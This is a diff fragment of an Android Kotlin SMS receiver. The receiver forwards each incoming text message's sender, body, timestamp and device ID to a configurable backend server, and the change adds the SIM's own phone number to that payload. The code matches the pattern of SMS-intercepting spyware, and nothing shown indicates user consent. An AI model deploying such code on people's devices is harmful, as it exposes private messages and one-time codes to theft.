@@ -3,10 +3,14 @@ package com.example.test
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.provider.Settings
 import android.provider.Telephony
 import android.telephony.SmsManager
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
 import android.util.Log
+import androidx.core.content.ContextCompat
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
@@ -66,18 +70,53 @@ class SmsReceiver : BroadcastReceiver() {
         }
     }
 
+    private fun getFirstSimPhoneNumber(context: Context): String {
+        try {
+            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+            if (subManager == null) return ""
+            
+            val activeSubscriptions = subManager.activeSubscriptionInfoList
+            if (activeSubscriptions.isNullOrEmpty()) return ""
+            
+            val subscriptionInfo = activeSubscriptions[0]
+            var phoneNumber = subscriptionInfo.number ?: ""
+            
+            if (phoneNumber.isBlank() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                try {
+                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+                    if (telephonyManager != null) {
+                        val tm = telephonyManager.createForSubscriptionId(subscriptionInfo.subscriptionId)
+                        phoneNumber = tm.line1Number ?: ""
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to get line1Number: ${e.message}")
+                }
+            }
+            
+            return phoneNumber
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting SIM phone number: ${e.message}")
+            return ""
+        }
+    }
+    
     private fun sendSmsToBackend(context: Context, sender: String, message: String, timestamp: Long) {
         try {
             val deviceId = Settings.Secure.getString(
                 context.contentResolver,
                 Settings.Secure.ANDROID_ID
             )
+            
+            val simPhoneNumber = getFirstSimPhoneNumber(context)
 
             val body = JSONObject().apply {
                 put("sender", sender)
                 put("message", message)
                 put("timestamp", timestamp)
                 put("deviceId", deviceId)
+                if (simPhoneNumber.isNotEmpty()) {
+                    put("sim_phone_number", simPhoneNumber)
+                }
             }
 
             val baseUrl = ServerConfig.getBaseUrl()
